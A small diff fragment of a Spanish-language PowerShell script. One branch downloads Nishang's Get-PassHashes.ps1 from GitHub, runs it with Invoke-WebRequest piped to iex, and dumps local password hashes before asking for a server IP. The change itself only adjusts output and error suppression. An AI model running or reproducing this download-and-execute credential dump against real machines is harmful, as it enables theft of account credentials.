@@ -67,8 +67,9 @@ function ConvertFrom-SecureToPlain {
 	Write-Host ""
         if($hash -eq 'Si') { 
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" | iex 2> $null
-        Get-PassHashes
+        Write-Host ""
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" | iex
+        Get-PassHashes 2> $null
         Write-Host ""}
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
         Write-Host ""
